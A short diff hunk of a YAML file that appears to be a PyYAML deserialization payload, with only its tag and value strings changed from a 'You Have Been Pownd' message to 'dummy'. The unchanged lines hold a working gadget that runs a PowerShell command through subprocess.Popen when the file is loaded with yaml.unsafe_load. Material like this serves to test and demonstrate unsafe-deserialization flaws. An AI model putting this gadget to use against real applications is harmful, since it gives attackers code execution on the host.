@@ -4,6 +4,6 @@
 - !!python/object/new:yaml.MappingNode
   listitems: !!str '!!python/object/apply:subprocess.Popen [["powershell", "-Command", "dir"]]'
   state:
-    tag: !!str 'You Have Been Pownd'
-    value: !!str hacked
+    tag: !!str dummy
+    value: !!str dummy
     extend: !!python/name:yaml.unsafe_load
